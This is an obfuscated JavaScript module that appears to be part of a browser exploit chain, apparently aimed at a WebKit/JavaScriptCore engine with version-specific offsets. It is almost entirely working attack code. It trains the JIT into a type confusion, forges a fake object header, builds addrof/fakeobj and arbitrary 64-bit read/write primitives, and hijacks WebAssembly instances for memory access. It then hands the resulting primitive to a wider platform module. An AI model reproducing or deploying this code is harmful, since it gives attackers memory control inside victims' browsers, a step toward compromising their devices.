let r = {};
"use strict";
const {
  N: G,
  tn: W,
  nn: C,
  Vt: m,
  U: j,
  An: S,
  vn: O,
  T: l,
  v: o,
  I: u,
  B: s,
  K: R,
  O: K
} = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247");
const P = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
const x = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247");
async function q(t, e) {
  const n = 0;
  const r = 1;
  const i = 2;
  const s = 3;
  const o = (t) => {};
  let l = 170100;
  if (navigator.constructor.name === "Navigator") {
    o("");
    l = e;
  }
  const c = "00";
  const h = "01";
  const u = "02";
  const a = "03";
  const f = "04";
  const w = "05";
  const p = "06";
  const m = "07";
  const y = "08";
  const b = "09";
  const A = "0a";
  const U = "0b";
  const g = "0c";
  const d = "0d";
  const B = "0e";
  const v = "0f";
  const T = "10";
  const C = "11";
  const F = "12";
  const N = "13";
  const k = "14";
  const I = "15";
  const _ = "16";
  const W = "17";
  const j = "18";
  const R = "19";
  const D = "1a";
  const E = "1b";
  const H = "1c";
  const L = "1d";
  const M = "1e";
  const O = "1f";
  const V = "20";
  const J = "21";
  const G = "22";
  const K = "23";
  const $ = "24";
  const z = "25";
  const Q = "26";
  const X = "27";
  const Y = "28";
  const Z = "29";
  const tt = {};
  tt[c] = 176;
  tt[h] = 88;
  tt[u] = 96;
  tt[a] = 8;
  tt[f] = 16;
  tt[w] = 16;
  tt[p] = 24;
  tt[m] = 16;
  tt[y] = 24;
  tt[b] = 16;
  tt[A] = 16;
  tt[U] = 16;
  tt[g] = 328;
  tt[d] = 472;
  tt[B] = 512;
  tt[v] = 520;
  tt[T] = 664;
  tt[C] = 8;
  tt[F] = 0;
  tt[N] = 4;
  tt[k] = 12;
  tt[I] = 16;
  tt[_] = 20;
  tt[W] = 3;
  tt[j] = 32;
  tt[R] = 48;
  tt[D] = 16;
  tt[E] = 44;
  tt[H] = 48;
  tt[L] = 56;
  tt[M] = 32;
  tt[O] = 64;
  tt[V] = 112;
  tt[J] = 8;
  tt[G] = 24;
  tt[K] = 768;
  tt[$] = 144;
  tt[z] = 96;
  tt[Q] = 32;
  tt[X] = 52232;
  tt[Y] = 52240;
  tt[Z] = true;
  function et() {
    if (l >= 170000) {
      tt[h] = 96;
      tt[u] = 104;
      tt[X] = 77464;
      tt[Y] = 77472;
    }
    if (l >= 170100) {
      tt[X] = 78488;
      tt[Y] = 78496;
    }
    if (l >= 170200) {
      tt[X] = 78528;
      tt[Y] = 78536;
    }
  }
  function nt(t) {
    return "0x" + t.toString(16);
  }
  function rt(t) {
    return BigInt(t);
  }
  const it = BigInt(549755813887);
  const st = 127;
  const ot = BigInt(39);
  function lt(t) {
    return t & rt(it);
  }
  const ct = async () => {
    const t = new ut();
    const e = true;
    const n = false;
    const s = true;
    const l = 2;
    const h = 2;
    const m = {
      cleanup: () => {},
      Qs: []
    };
    function y(t, e, n = null) {
      U[t / 4] = e;
      U[t / 4 + 1] = n !== null ? n : e / b;
    }
    const b = 4294967296;
    let A = new ArrayBuffer(16);
    let U = new Uint32Array(A);
    let g = new Float64Array(A);
    let d = new BigUint64Array(A);
    let B = 0;
    function x(t, e = null) {
      y(B, t, e);
      return g[B / 8];
    }
    m.Xs = x;
    function v(t) {
      g[B / 8] = t;
      return U[B / 4] + b * U[B / 4 + 1];
    }
    function T(t) {
      g[B / 8] = t;
      return d[B / 8];
    }
    function C(t = 10000) {
      let e = [];
      for (let n = 0; n < t; ++n) e.push(new Uint8Array(10000));
    }
    function P() {
      for (let t = 0; t < 8; t++) new ArrayBuffer(16777216);
    }
    async function F(t) {
      try {
        if (window.testRunner) await print(testRunner.describe(t));
      } catch (t) {}
    }
    async function N(t, e) {
      let n = new ArrayBuffer(e);
      let r = new Uint32Array(n);
      for (let n = 0; n < e; n += 4) r[n / 4] = m.Ys(t + n);
      await dumphex(n);
    }
    function k(t) {
      let e = new ArrayBuffer(t.length);
      let n = new Uint8Array(e);
      for (let e = 0, r = t.length; e < r; e++) n[e] = t.charCodeAt(e);
      return e;
    }
    async function I(t) {
      return new Promise((e, n) => setTimeout(e, t));
    }
    function S(t) {
      let e = new Uint32Array(t);
      let n = m.Zs(m.so(e) + 16);
      m.Qs.push(e);
      return [e, n];
    }
    function _(t) {
      let e = new Uint8Array(t);
      let n = m.Zs(m.so(e) + 16);
      m.Qs.push(e);
      return [e, n];
    }
    const W = 16777216;
    const j = 131072;
    const R = 4294967296;
    const D = R - 1;
    let E = new Float64Array(1);
    let H = new Uint32Array(E.buffer);
    function L(t) {
      E[0] = t;
      return H[1] * R + H[0];
    }
    let M = new Uint32Array(2);
    let O = new Float64Array(M.buffer);
    let V = new Uint32Array(2);
    let J = new BigUint64Array(V.buffer);
    let G = new Float64Array(V.buffer);
    function K(t) {
      M[1] = t / R;
      M[0] = t & D;
      return O[0];
    }
    pm = {
      init: function () {
        o("");
        pm.tmput32 = new Uint32Array(2);
        pm.tmpFl = new Float64Array(pm.tmput32.buffer);
        pm.phantom = {
          fakeHeader: 1,
          fakeButterfly: 2
        };
        pm.trapArray = [1.1, pm.phantom];
        let trainingArray = [1.1, 1.1];
        trainingArray.ho = 1.1;
        let fallbackArray = [1.1, 2.2];
        fallbackArray.ho = 1.1;
        function n() {}
        let targetObj = Reflect.construct(Object, [], n);
        let divergentObj = Reflect.construct(Object, [], n);
        targetObj.p1 = trainingArray;
        targetObj.p2 = trainingArray;
        divergentObj.p1 = 4919;
        divergentObj.p2 = 4919;
        delete divergentObj.p2;
        delete divergentObj.p1;
        divergentObj.p1 = 4919;
        divergentObj.p2 = 4919;
        let guardObj = {
          guard_p1: 1,
          p1: [1.1, 2.2]
        };
        let lowBits = new Uint32Array(2);
        let asDouble = new Float64Array(lowBits.buffer);
        let trigger = function (useDivergent, earlyExit) {
          if (earlyExit) return;
          let obj = targetObj;
          if (useDivergent) {
            obj = divergentObj;
            0[0];
          }
          let h = 0;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          "uo" in obj;
          let arr = obj.p1;
          if (useDivergent) arr = fallbackArray;
          asDouble[0] = arr[1];
          lowBits[0] = lowBits[0] + 16;
          arr[1] = asDouble[0];
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
          while (h < 1) {
            guardObj.guard_p1 = 1;
            h++;
          }
          h--;
        };
        for (let t = 0; t < W; t++) {
          if (t > j) {
            trigger(false, true);
            continue;
          }
          trigger(t % 2 && t < 256, t > 4096);
          if (t == j) delete targetObj.p2;
        }
        for (let t = 0; t < 1048576; t++) new Array(13.37, 13.37, 13.37, 13.37);
        delete targetObj.p1;
        targetObj.p1 = pm.trapArray;
        targetObj.p2 = 1;
        trigger(false, false);
      },
      packHeader: function (t) {
        pm.tmput32[0] = t[0];
        pm.tmput32[1] = t[1] - 131072;
        return pm.tmpFl[0];
      },
      setPhantomHeader: function (t) {
        pm.phantom.fakeHeader = t;
      },
      wo: function () {
        pm.gRWArray1 = [{}, {}, {}];
        let fakeArrayLike = {
          p1: 1,
          p2: 1,
          length: 16
        };
        Array.prototype.fill.call(fakeArrayLike, 1.1);
        let commBuffer = new Float64Array(8);
        let commView32 = new Uint32Array(commBuffer.buffer);
        var i = [];
        for (let t = 0; t < 16; t++) i[t] = {};
        pm.ref = i[7];
        pm.ref2 = i[8];
        var s = pm.packHeader([201527, 16783110]);
        pm.far = [201527, 201527];
        pm.tmpOptArr = [];
        for (let t = 0; t < 256; t++) pm.tmpOptArr[t] = {
          a1: 3.14,
          a2: 1.1
        };
        let overlapObj = {
          b1: pm.ref2
        };
        overlapObj[0] = 1.1;
        overlapObj[1] = 1.1;
        overlapObj[2] = 1.1;
        overlapObj[3] = 1.1;
        overlapObj[4] = 1.1;
        for (let t = 256; t < 512; t++) pm.tmpOptArr[t] = {
          a1: 3.14,
          a2: 1.1
        };
        let adjacentObj = pm.tmpOptArr[256];
        adjacentObj[0] = 1.1;
        adjacentObj[1] = 1.1;
        adjacentObj[2] = 1.1;
        adjacentObj[3] = 1.1;
        adjacentObj[4] = 1.1;
        let altAdjacentObj = pm.tmpOptArr[255];
        altAdjacentObj[0] = 1.1;
        altAdjacentObj[1] = 1.1;
        altAdjacentObj[2] = 1.1;
        altAdjacentObj[3] = 1.1;
        altAdjacentObj[4] = 1.1;
        pm.gRWArray1[0] = fakeArrayLike;
        pm.gRWArray1[2] = fakeArrayLike;
        pm.phantom.fakeHeader = s;
        pm.phantom.fakeButterfly = overlapObj;
        function phantomRW(writeIndex, writeValue) {
          let r = pm.gRWArray1[0];
          commBuffer[0] = r[2];
          commBuffer[1] = r[4];
          commBuffer[2] = r[5];
          commBuffer[3] = r[0];
          commBuffer[4] = r[1];
          r = pm.gRWArray1[2];
          r[writeIndex] = writeValue;
        }
        for (let t = 0; t < 1048576; t++) phantomRW(1, 1.1);
        m.po = function (n) {
          overlapObj.b1 = n;
          pm.gRWArray1[2] = fakeArrayLike;
          phantomRW(1, 1.1);
          return L(commBuffer[0]);
        };
        let rwArray = new Array(1.1, 1.1, 1.1, 1.1);
        rwArray[0] = 1.1;
        let targets = [rwArray, fakeArrayLike];
        function readGadget() {
          let arr = targets[0];
          let proxy = targets[1];
          arr[2] = 3.3;
          proxy[0] = commBuffer[0];
          useless[1] = 3.3;
          commBuffer[0] = arr[0];
          proxy[0] = commBuffer[1];
          return commBuffer[0];
        }
        for (let t = 0; t < 1048576; t++) {
          useless = new Array(1, 2, 3);
          readGadget(t + 3.3);
          readGadget(t + .1);
        }
        function writeGadget() {
          let arr = targets[0];
          let proxy = targets[1];
          arr[2] = 3.3;
          proxy[0] = commBuffer[0];
          useless[1] = 3.3;
          arr[0] = commBuffer[2];
          proxy[0] = commBuffer[1];
        }
        for (let t = 0; t < 1048576; t++) {
          useless = new Array(1, 2, 3);
          writeGadget(t + 3.3, 13.37);
          writeGadget(t + 3.3, 13.37);
        }
        pm.gRWArray1[0] = pm.trapArray[1];
        pm.trapArray[1] = null;
        phantomRW(1, 3.14);
        pm.far[0] = commView32[6];
        pm.far[1] = 16783110;
        var p = pm.packHeader(pm.far);
        pm.setPhantomHeader(p);
        pm.far[1] = 16783104;
        var y = pm.packHeader(pm.far);
        pm.ref2Address = m.po(pm.ref2);
        var b = m.po(overlapObj);
        var A = m.po(adjacentObj);
        var U = m.po(altAdjacentObj);
        var g = A - b;
        var d = U - b;
        if (pm.ref2Address == 0x7ff8000000000000 || g != 32 && d != 32) {
          pm.setPhantomHeader(y);
          pm.gRWArray1[0] = fakeArrayLike;
          phantomRW(1, 3.14);
          throw r;
        }
        if (d == 32) {
          adjacentObj = altAdjacentObj;
          altAdjacentObj = null;
        }
        let B = m.po(rwArray);
        phantomRW(1, 1.1);
        let savedButterfly = commBuffer[4];
        pm.phantom.fakeButterfly = overlapObj;
        pm.gRWArray1[2] = pm.gRWArray1[0];
        phantomRW(5, K(B + 8));
        pm.gRWArray1[2] = fakeArrayLike;
        for (let t = 0; t < 8388608; t++) {
          readGadget(t + 13.37);
          writeGadget(13.38, 13.38);
        }
        function read64(addr) {
          targets[1] = adjacentObj;
          commBuffer[0] = K(addr);
          commBuffer[1] = savedButterfly;
          return L(readGadget());
        }
        function write64(addr, val) {
          targets[1] = adjacentObj;
          commBuffer[0] = K(addr);
          commBuffer[1] = savedButterfly;
          commBuffer[2] = K(val);
          writeGadget();
        }
        function C(t, n) {
          targets[1] = adjacentObj;
          commBuffer[0] = K(t);
          commBuffer[1] = savedButterfly;
          commBuffer[2] = n;
          writeGadget();
        }
        m.mo = read64;
        m.yo = write64;
        m.bo = C;
        let structDonor = {};
        structDonor[0] = .1;
        objectForCellAddr = m.po(structDonor);
        pm.far[0] = read64(objectForCellAddr - 4) / R;
        pm.far[1] = 16783110;
        pm.setPhantomHeader(pm.packHeader(pm.far));
      },
      Ao: function () {
        o("");
        let t = new Array(4096).fill(13.37);
        function e() {
          return t.length;
        }
        pm.testobj = {
          a: 1
        };
        pm.testobjAddr = m.po(pm.testobj) + 16;
        m.po = function (t) {
          pm.testobj.a = t;
          return m.mo(pm.testobjAddr);
        };
        m.so = (t) => m.po(t);
        for (let t = 0; t < 1048576; t++) e(t + .1);
        for (let n = 0; n < 1048576; n++) {
          m.po(t);
          e(n + .1);
        }
        for (let n = 0; n < 1048576; n++) {
          m.so(t);
          e(n + .1);
        }
        const n = m.po(t);
        const r = m.mo(n + 8);
        m.Ys = function (t) {
          m.yo(n + 8, t + 8);
          let i = e();
          m.yo(n + 8, r);
          return i >>> 0;
        };
        m.Zs = function (t) {
          return m.Ys(t) + (m.Ys(t + 4) & 127) * 4294967296;
        };
        m.Uo = function (t) {
          return m.Ys(t) + (m.Ys(t + 4) & 32767) * 4294967296;
        };
        m.do = function (t) {
          let e = m.Ys(t);
          let n = m.Ys(t + 4);
          return [e, n];
        };
        m.Bo = function (t, e) {
          m.bo(t, e);
        };
        m.xo = function (t, e) {
          m.yo(t, e);
        };
        m.vo = function (t, e, n) {
          U[0] = e;
          U[1] = n;
          m.Bo(t, g[0]);
        };
        m.To = function (t) {
          let e = m.do(t);
          U[0] = e[0];
          U[1] = e[1];
          return g[0];
        };
      },
      test: function () {
        o("");
        let [t, e] = S(16);
        t[0] = 4919;
        t[1] = 16705;
        let n = m.do(e);
        if (n[0] !== 4919 || n[1] !== 16705) throw new Error("n[0] !== 4919 || n[1] !== 16705");
        o("");
        m.xo(e, 57005);
        if (t[0] !== 57005) throw new Error("t[0] !== 57005");
        o("");
      },
      cleanup: function () {
        o("");
        for (let t = 0; t < pm.tmpOptArr.length; t++) pm.tmpOptArr[t] = null;
        pm.tmpOptArr = null;
        m.vo(pm.ref2Address + 24, m.Zs(m.po(pm.ref) + 24));
        pm.gRWArray1[0] = null;
        pm.gRWArray1[2] = null;
        pm.ref2 = null;
      }
    };
    async function $() {
      o("");
      function e(t) {
        if (typeof t == "bigint") {
          J[0] = t;
          t = V[0] + (V[1] & 127) * 4294967296;
        }
        let e = m.Ys(t);
        let n = m.Ys(t + 4);
        V[0] = e;
        V[1] = n;
        return J[0];
      }
      function n(t, e) {
        if (typeof t == "bigint") {
          J[0] = t;
          t = V[0] + (V[1] & 127) * 4294967296;
        }
        m.Bo(t, e);
      }
      function r(t) {
        pm.testobj.a = t;
        return e(pm.testobjAddr);
      }
      pm.init();
      pm.wo();
      pm.Ao();
      pm.test();
      const i = (t) => {
        const n = r(t);
        o("");
        const i = e(n + rt(tt[w]));
        o("");
        const s = i + rt(tt[c]);
        const l = e(s);
        return [i, s, l];
      };
      const s = r(t.os);
      const [l, h, a] = i(t.es);
      const [f, p, y] = i(t.ss);
      o("");
      o("");
      o("");
      n(f + rt(tt[u]), -0);
      n(l + rt(tt[u]), -0);
      n(h, t.Oi.wn(p));
      pm.cleanup();
      t.ws = f;
      t.ds = y;
      t.ys = l;
      t.As = a;
      t.Us = s;
    }
    async function q() {
      const e = t;
      self.postMessage({
        type: i
      });
      self.setTimeout(() => {
        const t = e.getObjectAddress(e.es);
        o("");
        const n = e.read64(t + rt(tt[w]));
        o("");
        const r = e.read64(n + rt(tt[a]));
        o("");
        const i = e.read64(t + rt(tt[p]));
        o("");
        const s = e.read64(n + rt(tt[f]));
        o("");
        const l = e.read64(r + rt(tt[Q]));
        o("");
        const h = e.read64(r + rt(tt[X]));
        o("");
        const m = e.read64(h + rt(tt[Y]));
        o("");
        const y = e.read64(h + rt(tt[X]));
        o("");
        const b = e.read64(h + rt(tt[Q]));
        o("");
        const A = (t) => {
          const e = readBigPtr(inst_jsptr + rt(tt[w]));
          const n = e + rt(tt[c]);
          const r = readBigPtr(n);
          return [e, n, r];
        };
        const U = () => {
          for (let t = -0x1800n; t > -0x3000n; t -= 0x8n) {
            const n = b - t;
            if (e.read64(n) == 0xfffe000000055432n && e.read64(n + 0x8n * 2n) == 0xfffe000000055432n && e.read64(n + 0x8n * 3n) == 0xfffe0000000ff432n && e.read64(n + 0x8n * 5n) == 0xfffe0000000ff432n) {
              o("");
              const t = e.read64(n + 0x8n * 1n);
              const r = e.read64(t + 0x8n);
              o("");
              const i = e.read64(n + 0x8n * 4n);
              const s = e.read64(i + 0x8n);
              o("");
              o("");
              o("");
              o("");
              const l = e.read64(r);
              o("");
              const h = e.read64(l + rt(tt[w]));
              o("");
              const a = h + rt(tt[c]);
              o("");
              const f = e.read64(r + 0x8n);
              o("");
              const p = e.read64(f + rt(tt[w]));
              o("");
              const m = p + rt(tt[c]);
              o("");
              e.write64(p + rt(tt[u]), 0x8000000000000000n);
              e.write64(h + rt(tt[u]), 0x8000000000000000n);
              e.write64(a, m);
              e.write64(s + 0x0n, p);
              e.write64(s + 0x8n, m);
              e.write64(s + 0x10n, h);
              e.write64(s + 0x18n, a);
              e.write64(s + 0x20n, t);
              e.write64(s + 0x28n, 0x0n);
              return;
            }
          }
          self.setTimeout(U, 10);
        };
        self.setTimeout(U, 0);
      }, 120);
    }
    o("");
    try {
      await $();
      await q();
    } catch (t) {
      if (t === r) self.postMessage({
        type: r
      });else throw t;
    }
  };
  const ht = async (t) => {
    o("");
    const e = JSON.parse("[0.0, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9, 10.10]");
    const c = new ut();
    const h = c.os;
    e[0] = c.Oi.wn(0xdeadn);
    e[1] = -0;
    h[0] = c.es;
    h[1] = c.ss;
    const u = () => {
      const n = [349234, h, 349234, 1045554, e, 1045554];
      const r = (t, ...e) => {
        try {
          r(t + 1, ...n, ...e);
        } catch (t) {}
      };
      r(0, n);
      if (e[5] !== 6.6) {
        o("");
        try {
          o("");
          c.ws = c.Oi.Co(e[0]);
          c.ds = c.Oi.Co(e[1]);
          c.ys = c.Oi.Co(e[2]);
          c.As = c.Oi.Co(e[3]);
          c.Us = c.Oi.Co(e[4]);
          P.platformState.exploitPrimitive = c;
          t();
        } catch (t) {
          o(t);
        }
      } else window.setTimeout(u, 0);
    };
    const a = () => {
      const t = q.toString();
      const e = "(" + t.toString() + ")()";
      const c = URL.createObjectURL(new Blob([e], {
        type: "text/javascript"
      }));
      const h = new Worker(c);
      URL.revokeObjectURL(c);
      o("");
      h.onerror = (t) => {
        o("");
      };
      h.onmessage = (t) => {
        if (t.data.type === n) ;else if (t.data.type === r) {
          o("");
          h.terminate();
          a();
        } else if (t.data.type === i) {
          o("");
          window.setTimeout(u, 0);
        }
      };
      h.postMessage({
        type: s,
        xn: l
      });
    };
    a();
  };
  class ut {
    addrof(t) {
      return x.K(this.getObjectAddress(t));
    }
    readStringFromInt64(t, e = 256) {
      const n = x.O(t.yt());
      return this.readString(n, e);
    }
    readInt64FromOffset(t) {
      const e = this.read32(x.O(t));
      const n = this.read32(x.O(t + 4));
      return new x.Int64(e, n);
    }
    read32FromInt64(t) {
      return this.read32(x.O(t.yt()));
    }
    readInt64FromInt64(t) {
      return this.readInt64FromOffset(t.yt());
    }
    writeInt64ToOffset(t, e) {
      const n = x.O(t);
      const r = e.Nt();
      this.write64(n, r);
    }
    readDoubleAsPointer(t, e = false) {
      const n = this.read32(x.O(t));
      let r = this.read32(x.O(t + 4));
      if (e === true || tt[Z]) r &= st;
      return x.T(n, r);
    }
    readRawBigInt(t) {
      return this.readInt64FromOffset(t).yt();
    }
    busyWait(t, e = 768) {
      for (let t = 0; t < e; t += 8) o("");
    }
    copyBigInt(t, e) {
      this.write64(x.O(t), x.O(e));
    }
    fakeobj(t) {
      if (t instanceof ArrayBuffer) t = new Uint8Array(t);
      const e = this.getObjectAddress(t);
      return x.K(lt(this.read64(e + rt(tt[m]))));
    }
    withTempOverrides(t, ...e) {
      const n = new Array(e.length + 10);
      for (let t = 0; t < e.length; t++) n[t] = this.readInt64FromOffset(e[t].Ir);
      try {
        for (let t = 0; t < e.length; t++) this.writeInt64ToOffset(e[t].Ir, e[t].Zt);
        t();
      } finally {
        for (let t = 0; t < e.length; t++) this.writeInt64ToOffset(e[t].Ir, n[t]);
      }
    }
    constructor() {
      const t = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 9, 2, 96, 0, 1, 126, 96, 1, 126, 0, 3, 3, 2, 0, 1, 4, 4, 1, 111, 0, 1, 5, 3, 1, 0, 1, 6, 82, 8, 123, 1, 253, 12, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 11, 126, 1, 66, 205, 215, 182, 222, 218, 249, 234, 230, 171, 127, 11, 123, 1, 253, 12, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 11, 111, 1, 208, 111, 11, 111, 1, 208, 111, 11, 111, 1, 208, 111, 11, 111, 1, 208, 111, 11, 111, 1, 208, 111, 11, 7, 29, 4, 4, 101, 100, 102, 121, 3, 1, 6, 109, 101, 109, 111, 114, 121, 2, 0, 3, 98, 116, 108, 0, 0, 3, 97, 108, 116, 0, 1, 10, 13, 2, 4, 0, 35, 1, 11, 6, 0, 32, 0, 36, 1, 11]);
      const e = (t) => t.exports["btl"]();
      const n = (t, e) => {
        t.exports["alt"](e);
      };
      this.ts = [];
      const r = new WebAssembly.Module(t, {});
      this.es = new WebAssembly.Instance(r, {});
      this.es[0] = 3;
      this.rs = e.bind(null, this.es);
      this.ns = n.bind(null, this.es);
      this.ss = new WebAssembly.Instance(r, {});
      this.ss[0] = 3;
      this.ls = e.bind(null, this.ss);
      this.hs = n.bind(null, this.ss);
      this.os = [{}, 1, 8];
      this.os["q23"] = 90;
      this.Qi = new ArrayBuffer(16);
      this.fs = new Uint32Array(this.Qi);
      this.cs = new BigUint64Array(this.Qi);
      this.bs = new ArrayBuffer(32);
      this.us = new DataView(this.bs);
      this.Oi = new ft();
      const i = 0n;
      for (let t = 0; t < 1; t++) {
        this.rs();
        this.ls();
        this.ns(i);
        this.hs(i);
      }
      this.Po = 1;
      this.Fo = 2;
      this.No = 4;
      this.ko = 8;
      this.Io = new at(this);
    }
    So() {
      return this.Io;
    }
    storeExploitState(t, e, n, r, i) {
      this.ws = this.Oi.Bn(t);
      this.ds = this.Oi.Bn(e);
      this.ys = this.Oi.Bn(n);
      this.As = this.Oi.Bn(r);
      this.Us = this.Oi.Bn(i);
      o("");
      o("");
      o("");
      o("");
      o("");
    }
    cleanup() {}
    writeToInstanceA(t) {
      this.ns(t);
    }
    writeAndRead(t) {
      this.writeToInstanceA(t);
      return this.ls();
    }
    writeAndWrite(t, e) {
      this.writeToInstanceA(t);
      return this.hs(e);
    }
    read64(t) {
      this.cs[0] = this.writeAndRead(t);
      return this.cs[0];
    }
    getJITCodePointer(t) {
      if (!(t instanceof Function)) throw new Error("!(t instanceof Function)");
      const e = this.getObjectAddress(t);
      const n = this.read64(e + BigInt(tt[y]));
      return n;
    }
    write32(t, e) {
      if (typeof t === "bigint") {
        const n = this.read64(t);
        this.cs[0] = n;
        this.fs[0] = e;
        const r = this.cs[0];
        this.writeAndWrite(t, r);
      } else return this.write32(x.O(t), e);
    }
    allocCString(t) {
      const e = new Uint8Array(new ArrayBuffer(t.length + 1));
      for (let n = 0; n < t.length; n++) e[n] = t.charCodeAt(n);
      return [e, this.getDataPointer(e)];
    }
    allocZeroBuffer(t) {
      const e = new Uint8Array(new ArrayBuffer(Number(t)));
      const n = this.getDataPointer(e);
      this.ts.push(e);
      return n;
    }
    allocZeroBufferPair(t) {
      const e = new Uint8Array(new ArrayBuffer(Number(t)));
      const n = this.getDataPointer(e);
      this.ts.push(e);
      return [e, n];
    }
    getDataPointer(t) {
      if (t instanceof ArrayBuffer) t = new Uint8Array(t);
      const e = this.getObjectAddress(t);
      return lt(this.read64(e + 0x10n));
    }
    patchByte(t, e) {
      this.us.setBigUint64(0, this.read64(t), true);
      this.us.setUint8(0, e, true);
      this.write64(t, this.us.getBigUint64(0, true));
    }
    readString(t, e = 768) {
      let n = t;
      if (typeof t === "number") n = x.O(t);
      let r = "";
      for (let t = 0; t < e; t++) {
        const e = this.readByte(n + BigInt(t));
        if (e === 0) break;
        r += String.fromCharCode(e);
      }
      return r;
    }
    readByte(t) {
      return this.read32(t) & 255;
    }
    read32(t) {
      if (typeof t === "bigint") {
        this.cs[0] = this.writeAndRead(t);
        return this.fs[0];
